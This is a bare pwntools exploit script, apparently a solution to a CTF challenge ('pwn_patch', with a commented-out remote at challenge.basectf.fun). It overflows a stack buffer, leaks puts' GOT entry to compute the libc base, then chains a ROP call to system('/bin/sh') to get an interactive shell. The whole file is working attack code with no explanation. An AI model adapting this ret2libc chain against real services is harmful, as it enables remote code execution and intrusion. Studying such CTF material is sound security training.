from pwn import *
context(arch="amd64",log_level="debug")
context.terminal = ['tmux', 'splitw', '-h'] 

p = process("./examples/pwn_patch")
gdb.attach(p)
#pause()
#p = remote("challenge.basectf.fun",42571)
elf = ELF("./examples/pwn_patch")
libc = ELF("libc.so.6")

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
pop_rdi_ret = 0x0000000000401176
main = 0x00000000004011DF
payload = b"A"*18 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
p.sendline(payload)
libc_base = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00")) - 0x80e50
log.success("libc_base:"+hex(libc_base))
system = libc_base + libc.sym["system"]
bin_sh_add = libc_base + 0x00000000001d8678
ret = 0x0000000000401220
payload = b"A"*18 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_add) + p64(system) 
p.sendline(payload)
p.interactive()
